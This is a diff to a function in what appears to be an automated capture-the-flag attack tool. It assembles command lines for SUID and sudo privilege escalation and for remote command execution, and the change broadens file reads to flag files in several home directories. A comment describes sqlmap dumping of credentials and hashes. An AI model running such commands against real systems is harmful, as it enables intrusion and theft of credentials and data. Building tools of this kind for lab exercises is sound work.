@@ -114,8 +114,12 @@ def closer_commands(history: str, target: str) -> list[str]:
         cmds.append(f"suid-hijack --url {u} --param {p} --mode {mode} --flag /root/flag.txt")
         cmds.append(f"sudo-gtfo --url {u} --param {p} --method {meth} --mode {mode} "
                     f"--flag /root/flag.txt")
+        # Direct read of the proof — try the standard flag locations, not just /root (a flag commonly
+        # sits at /flag.txt, the current user's home, or another user's home), so the extractor catches
+        # it wherever it is. Any GRIN{...}/sensitive content in the output is captured.
         cmds.append(f"web-rce --url {u} --param {p} --method {meth} --mode {mode} "
-                    f"--cmd 'cat /root/flag.txt'")
+                    f"--cmd 'cat /flag.txt /root/flag.txt ~/flag.txt 2>/dev/null; "
+                    f"cat /home/*/flag.txt 2>/dev/null'")
         # SQLi: deterministically test+dump the parameter with sqlmap (--batch = non-interactive).
         # Dumped creds/hashes/flags are caught by the extractors; --threads for speed, capped risk.
         _q = u if "?" in u else f"{u}?{p}=1"
